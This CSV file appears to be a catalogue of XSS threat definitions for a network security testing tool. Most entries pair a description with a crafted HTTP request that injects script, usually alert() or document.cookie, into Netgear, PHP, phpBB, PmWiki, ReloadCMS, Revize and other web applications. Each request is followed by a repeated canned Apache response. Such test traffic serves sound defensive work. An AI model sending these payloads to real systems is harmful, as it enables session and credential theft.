XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
ned_xss.xml,Nokia Electronic Documentation Cross Site Scripting,This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing. ,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿netgear_xss.xml,Netgear URL Filter Cross-Site Scripting Injection,"This threat sends a URL request for a file that should be filtered by a Netgear router.  The Netgear router in this instance will filter the request, block the URL, and enter an entry into its log.  However, this entry can be used as a vector of attack with cross site scripting injection.  When the log is later viewed by a user, the Javascript is executed with the privileges of the logged in user.",HTTP,TCP,GET /malware.exe</textarea><script>alert('imperfectRox')</script> HTTP/1.0||0D 0A 0D 0A||
netgear_xss.xml,Netgear URL Filter Cross-Site Scripting Injection,"This threat sends a URL request for a file that should be filtered by a Netgear router.  The Netgear router in this instance will filter the request, block the URL, and enter an entry into its log.  However, this entry can be used as a vector of attack with cross site scripting injection.  When the log is later viewed by a user, the Javascript is executed with the privileges of the logged in user.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿netgear_xss2.xml,Netgear URL Logging XSS,This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80.,HTTP,TCP,GET / HTTP/1.0||0D 0A ||Host||3A || </textarea><script>alert('XSS!blabla')||3B 0D 0A 0D 0A||
netgear_xss2.xml,Netgear URL Logging XSS,This threat sends a cross-site scripting attempt to a third party webpage.  The netgear URL filter logging process then places this output unfiltered in its log webpage.  This allows an attacker to execute arbitrary javascript with permissions of the administrator viewing the page.  This threat targets a webserver listening on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿oracle_reports_xss.xml,Oracle Reports Server XSS Attempt,This threat represents an attempt to cause a cross-site scripting attack on Oracle Reports 10g.  This can be used to gain user credentials and other sensitive user data.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿php_phpinfo_xss.xml,PHP 4.4.3 - 4.4.6 phpinfo() Remote Cross-Site Scripting Variant Vulnerability,"This threat attempts to cause a cross site scripting condition through the phpinfo() function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. PHP is a web application and programming language, it is used typically web servers listening on port 80.",HTTP,TCP,GET /phpinfo.php?a[]=<script>alert(/XSS/)||3B ||</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || msnbot/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
php_phpinfo_xss.xml,PHP 4.4.3 - 4.4.6 phpinfo() Remote Cross-Site Scripting Variant Vulnerability,"This threat attempts to cause a cross site scripting condition through the phpinfo() function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. PHP is a web application and programming language, it is used typically web servers listening on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbb_datenbank_xss.xml,Datenbank Module For PHPBB Remote Mod.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. PHPBB is a we based application that typically listens on port 80.,HTTP,TCP,"GET www.example.com/phpBB/moddb/mod.php?id='>&lt||3B ||script&gt||3B ||alert(document.cookie)&lt||3B ||/script&gt||3B || HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux x86_64||3B || en-US||3B || rv||3A ||1.7.12) Gecko/20051020 Epiphany/1.8.2||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300..Connection||3A || keep-alive..Cache-Control||3A || max-age=0||0D 0A 0D 0A||"
phpbb_datenbank_xss.xml,Datenbank Module For PHPBB Remote Mod.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. PHPBB is a we based application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpcommunitycalendar_xss.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTML to be included in the returned page via month.php's ""LoName"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,"GET /month.php?LoName=<script>alert('XSS')</script> HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpcommunitycalendar_xss.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTML to be included in the returned page via month.php's ""LoName"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpcommunitycalendar_xss_b.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTTP to be included in the returned page via event.php's ""link"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,"GET /event.php?AddressLink=||22 ||><script>alert('XSS')</script><||22 || HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpcommunitycalendar_xss_b.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTTP to be included in the returned page via event.php's ""link"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpinfoXSS.xml,phpinfo() Cross Site Scripting Attempt,"This threat attempts to cause a cross site scripting condition through the phpinfo function call.  By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details.  PHP is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpraid_XSS.xml,PHPraid View.php Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call.  By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details.  PHPraid is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿pmwiki_xss.xml,PmWiki Search Cross-Site Scripting Vulnerability,This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. PmWiki is a web application that typically listens on port 80.,HTTP,TCP,"GET /Site/Search?action=search&q=TRY%20ANOTHER%20SEARCH%20NOW!%20YES,%20YOU!'%20onMouseOver='alert(document.title)||3B ||'%20  HTTP/1.0||0D 0A 0D 0A||"
pmwiki_xss.xml,PmWiki Search Cross-Site Scripting Vulnerability,This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. PmWiki is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿refererXSS.xml,Generic Referer XSS Attempt,"This attack represents a cross-site scripting attack through the referer field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,GET / HTTP/1.0||0A ||Referer||3A || http||3A ||//||22 ||/><SCRIPT>alert('1mp3rf3ctXSS')||3B ||</SCRIPT>||0A 0A 0A||
refererXSS.xml,Generic Referer XSS Attempt,"This attack represents a cross-site scripting attack through the referer field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿reloadcms_xss_cmi.xml,ReloadCMS User-Agent HTML Injection Vulnerability,"This threat sends a standard HTTP query containing html or php within the User-Agent header field, this flaw can be used as either a XSS or remote code execution flaw. ReloadCMS  typically listens on port 80.",HTTP,TCP,GET /reloadcms/ HTTP/1.0||0D 0A ||User-Agent||3A 0D 0A 22 ||><script>alert(||22 ||sucka||22 ||)||3B ||</script>||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
reloadcms_xss_cmi.xml,ReloadCMS User-Agent HTML Injection Vulnerability,"This threat sends a standard HTTP query containing html or php within the User-Agent header field, this flaw can be used as either a XSS or remote code execution flaw. ReloadCMS  typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿revizecms_xss.xml,Revize CMS HTTPTranslatorServlet XSS,This threat sends a crafted URL query that contains HTML or javascript to be included in the page. Revize CMS is an web application that typically listens on port 80.,HTTP,TCP,GET /revize/HTTPTranslatorServlet?redirect=/revize/admincenter/setWebSpace.jsp&action=login&resourcetype=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Esecurity&objectmap=subject&error=admincenter/login.jsp HTTP/1.0||0D 0A 0D 0A||
revizecms_xss.xml,Revize CMS HTTPTranslatorServlet XSS,This threat sends a crafted URL query that contains HTML or javascript to be included in the page. Revize CMS is an web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿rhino_xss.xml,Rhino XSS Attack,This threat demonstrates a cross-site scripting attack in RhinoSoft's webserver component of dns4me.,HTTP,TCP,"GET /?%3E%3Cscript%3Ealert('1mp3rf3ctr0x')%3C/script%3E HTTP/1.1||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux i686||3B || en-US||3B || rv||3A ||1.7) Gecko/20040626 Firefox/0.9.1||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
rhino_xss.xml,Rhino XSS Attack,This threat demonstrates a cross-site scripting attack in RhinoSoft's webserver component of dns4me.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿rwauction_xss.xml,RWAuction Pro Search.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript or HTML to be included in the returned page. RWAuction an web application that typically listens on port 80.,HTTP,TCP,GET /search.asp?searchtxt=<SCRIPT>alert(||22 ||XSS||22 ||)</SCRIPT> HTTP/1.0||0D 0A 0D 0A||
rwauction_xss.xml,RWAuction Pro Search.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript or HTML to be included in the returned page. RWAuction an web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿sawmill_xss.xml,Sawmill XSS Attempt,"This threat is executed when an attacker causes a victim to view a webpage with Javascript injected.  This can lead to various forms of identity theft.  This particular attack could work well against any HTTP based web system.  Sawmill is a web based log analysis tool, and typically listens on port 8987.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿selectapix_xss.xml,SelectaPix Cross-Site Scripting,This threat sends a crafted URL that contains Javascript which is included in the returned page. SelectaPix is an web application that typically listens on port 80,HTTP,TCP,GET /popup.php?albumID=2&imageID=<script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
selectapix_xss.xml,SelectaPix Cross-Site Scripting,This threat sends a crafted URL that contains Javascript which is included in the returned page. SelectaPix is an web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
